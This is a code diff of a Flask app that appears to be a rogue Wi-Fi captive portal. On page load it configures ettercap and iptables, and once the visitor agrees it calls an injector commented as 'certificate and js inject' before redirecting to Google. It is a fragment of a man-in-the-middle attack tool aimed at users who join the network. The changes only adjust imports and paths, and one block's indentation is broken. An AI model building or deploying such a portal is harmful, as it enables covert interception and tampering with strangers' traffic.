@@ -4,7 +4,6 @@ from flask import Flask, render_template, request, redirect, session
 import operator
 import mitmproxy
 import models
-import load_mitm
 
 app = Flask(__name__)
 
@@ -15,7 +14,7 @@ def welcome():
         models.config_ettercap()
         models.config_iptables()
         if True:
-            return render_template('wifi_m/landing_page/index.html')
+            return render_template('index.html')
     else:
         if request.form['submit'] == 'agree':
             models.injector() #certificate and js inject
@@ -23,7 +22,7 @@ def welcome():
                 if True:
                 return redirect ('http://www.google.com', code = 302)
         else:
-            return redirect ('/Golddigger/Welcome')
+            return redirect ('/Welcome')
 
 @app.route('/Admin', methods = ['GET','POST'])
 def admin():
